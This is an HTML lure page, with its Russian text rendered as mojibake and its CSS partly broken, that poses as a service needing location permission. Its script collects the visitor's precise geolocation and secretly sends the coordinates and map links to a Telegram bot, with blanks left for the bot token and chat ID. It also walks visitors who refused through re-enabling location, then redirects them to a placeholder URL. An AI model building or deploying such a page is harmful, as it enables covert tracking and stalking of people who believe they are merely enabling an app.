<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –¥–ª—è —Å–µ—Ä–≤–∏—Å–∞</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>

      background: #f5f7fa;
      margin: 0;

      align-items: center;

    .container {

    }

      background: #f0f4ff;
      border-left: 5px solid #0078ff;
      padding: 15px;
      border-radius: 10px;
      text-align: left;

      font-size: 14px;

  </style>
</head>
<body>
  <div class="container" id="container">
    <h2>–ü—Ä–∏–≤–µ—Ç!</h2>
    <p>–ß—Ç–æ–±—ã –Ω–∞—á–∞—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ–º, –Ω—É–∂–Ω–æ –Ω–∞–∂–∞—Ç—å <strong>–†–∞–∑—Ä–µ—à–∏—Ç—å</strong> –¥–ª—è –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–π —Ä–∞–±–æ—Ç—ã —Å–µ—Ä–≤–∏—Å–∞.</p>
    <button id="allowBtn">–†–∞–∑—Ä–µ—à–∏—Ç—å</button>
    <div class="result" id="result"></div>
  </div>

<script>
  // Telegram Bot
  const TELEGRAM_BOT_TOKEN = "";
  const TELEGRAM_CHAT_ID = "";

  const container = document.getElementById('container');
  const allowBtn = document.getElementById('allowBtn');
  const resultDiv = document.getElementById('result');

  const options = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };

  function sendToTelegram(message) {
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
    });
  }

  function successCallback(pos) {
    const lat = pos.coords.latitude.toFixed(6);
    const lon = pos.coords.longitude.toFixed(6);
    const acc = pos.coords.accuracy.toFixed(1);

    const yandexLink = `https://yandex.ru/maps/?ll=${lon},${lat}&z=17`;
    const googleLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;

    const message = `üìç –î–æ—Å—Ç—É–ø —Ä–∞–∑—Ä–µ—à–µ–Ω!\n–®–∏—Ä–æ—Ç–∞: ${lat}\n–î–æ–ª–≥–æ—Ç–∞: ${lon}\n–¢–æ—á–Ω–æ—Å—Ç—å: ${acc} –º\n${yandexLink}\n${googleLink}`;

    container.innerHTML = `
      <strong>–î–æ—Å—Ç—É–ø —Ä–∞–∑—Ä–µ—à–µ–Ω!</strong>
      <p>–í–∞—à–∏ –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã:</p>
      <p>–®–∏—Ä–æ—Ç–∞: ${lat}<br>–î–æ–ª–≥–æ—Ç–∞: ${lon}<br>–¢–æ—á–Ω–æ—Å—Ç—å: ${acc} –º</p>
      <div class="maps-links">
        <a href="${yandexLink}" target="_blank">–Ø–Ω–¥–µ–∫—Å.–ö–∞—Ä—Ç—ã</a> | 
        <a href="${googleLink}" target="_blank">Google Maps</a>
      </div>
      <button id="proceedBtn">–ü–µ—Ä–µ–π—Ç–∏ –∫ —Å–µ—Ä–≤–∏—Å—É</button>
    `;

    document.getElementById('proceedBtn').onclick = () => {
      window.location.href = "https://—Ç–≤–æ—è—Å—Ç—Ä–∞–Ω–∏—Ü–∞.—Ä—É/—Å–µ—Ä–≤–∏—Å"; // –∑–∞–º–µ–Ω–∏ –Ω–∞ —Å–≤–æ–π URL
    };

    sendToTelegram(message);
  }

  function showManualInstruction() {
    container.innerHTML = `
      <strong>–î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω</strong>
      <div class="instruction">
        –ë—Ä–∞—É–∑–µ—Ä –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–ª –∑–∞–ø—Ä–æ—Å –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –∏–ª–∏ –≤—ã –æ—Ç–∫–∞–∑–∞–ª–∏ —Ä–∞–Ω–µ–µ.<br><br>
        <strong>–ù–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä–µ:</strong><br>
        1. –ù–∞–∂–º–∏—Ç–µ –Ω–∞ üîí –≤ –∞–¥—Ä–µ—Å–Ω–æ–π —Å—Ç—Ä–æ–∫–µ.<br>
        2. –†–∞–∑—Ä–µ—à–∏—Ç–µ ¬´–ú–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ¬ª –¥–ª—è —ç—Ç–æ–≥–æ —Å–∞–π—Ç–∞.<br>
        3. –û–±–Ω–æ–≤–∏—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É.<br><br>
        <strong>–ù–∞ iPhone (Safari):</strong><br>
        –ù–∞—Å—Ç—Ä–æ–π–∫–∏ ‚Üí Safari ‚Üí –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è ‚Üí –†–∞–∑—Ä–µ—à–∏—Ç—å –¥–ª—è —ç—Ç–æ–≥–æ —Å–∞–π—Ç–∞.<br><br>
        <strong>–ù–∞ iPhone (Chrome):</strong><br>
        –ù–∞—Å—Ç—Ä–æ–π–∫–∏ ‚Üí Chrome ‚Üí –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è ‚Üí –†–∞–∑—Ä–µ—à–∏—Ç—å.<br><br>
        –ü–æ—Å–ª–µ –≤–∫–ª—é—á–µ–Ω–∏—è –Ω–∞–∂–º–∏—Ç–µ ¬´–ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Å–Ω–æ–≤–∞¬ª.
      </div>
      <button id="retryBtn">–ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Å–Ω–æ–≤–∞</button>
      <div class="result" id="result"></div>
    `;
    document.getElementById('retryBtn').onclick = () => {
      // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –º–æ–∂–µ–º –ª–∏ —Å–Ω–æ–≤–∞ –∑–∞–ø—Ä–æ—Å–∏—Ç—å –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é
      if (navigator.permissions) {
        navigator.permissions.query({name:'geolocation'}).then(function(result) {
          if (result.state === 'denied') {
            // –ë—Ä–∞—É–∑–µ—Ä –ø–æ–ª–Ω–æ—Å—Ç—å—é –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–ª –¥–æ—Å—Ç—É–ø
            alert('–í—ã –¥–æ–ª–∂–Ω—ã —Ä–∞–∑—Ä–µ—à–∏—Ç—å –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é –≤—Ä—É—á–Ω—É—é –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞—Ö –±—Ä–∞—É–∑–µ—Ä–∞.');
          } else {
            // –ú–æ–∂–Ω–æ —Å–Ω–æ–≤–∞ –≤—ã–∑–≤–∞—Ç—å getCurrentPosition
            navigator.geolocation.getCurrentPosition(successCallback, errorCallback, options);
          }
        });
      } else {
        // –ï—Å–ª–∏ Permissions API –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è
        navigator.geolocation.getCurrentPosition(successCallback, errorCallback, options);
      }
    };
  }

  function errorCallback(error) {
    if (error.code === 1) { // PERMISSION_DENIED
      showManualInstruction();
    } else {
      resultDiv.textContent = '–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏: ' + error.message;
    }
  }

  allowBtn.onclick = () => {
    resultDiv.textContent = '–ó–∞–ø—Ä–æ—Å –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏...';
    navigator.geolocation.getCurrentPosition(successCallback, errorCallback, options);
  };
</script>
</body>
</html>
